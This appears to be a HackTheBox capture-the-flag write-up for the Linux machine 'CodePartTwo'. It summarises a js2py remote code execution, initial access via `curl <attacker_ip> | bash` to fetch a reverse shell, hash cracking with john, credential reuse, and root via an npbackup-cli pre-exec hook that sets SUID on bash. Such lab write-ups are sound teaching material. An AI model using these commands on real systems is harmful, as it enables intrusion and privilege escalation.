# HTB — CodePartTwo

**Official HTB page**: [CodePartTwo](https://app.hackthebox.com/machines/CodePartTwo?tab=machine_info)

**Difficulty**: Easy  
**OS**: Linux  
**Release date**: 16 Aug, 2025
**Platforms**: HackTheBox  
**Tags**: Other

---

## Initial Enumeration
- Nmap scan revealed:
  - 22 (SSH – OpenSSH 8.2p1)
  - 8000 (HTTP – Gunicorn 20.0.4)
- Web application exposed a login panel
- After authentication, access to a JavaScript dashboard

---

## Vulnerability Identified
- JS2PY RCE in the JavaScript editor
- Allowed command execution on the target
- Used payload to fetch and execute a reverse shell

---

## Initial Access
- Created a malicious `index.html` containing reverse shell
- Hosted it with:
  - `python3 -m http.server`
- Executed payload in JS editor:
  - `curl <attacker_ip> | bash`
- Received reverse shell on the target

---

## Pivot
- Located SQLite database:
  - `/app/instance/users.db`
- Extracted user hashes
- Cracked hash with `john`
- Reused credentials to pivot to user `marco`

---

## Privilege Escalation
- `sudo -l` revealed:
  - `(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli`
- Binary is a Python script
- Script loads configuration file provided with `-c`
- Copied original config to writable location
- Added:
  - `pre_exec_commands: ["chmod u+s /bin/bash"]`
- Executed:
  - `sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf -b`
- Spawned SUID bash:
  - `/bin/bash -p`
- Obtained root shell

---

## Key Takeaways
- JS2PY leads to reliable RCE when code execution is exposed
- Credential reuse enables lateral movement
- Python sudo scripts are dangerous when user-controlled config is allowed
- Pre-execution hooks can be abused for privilege escalation
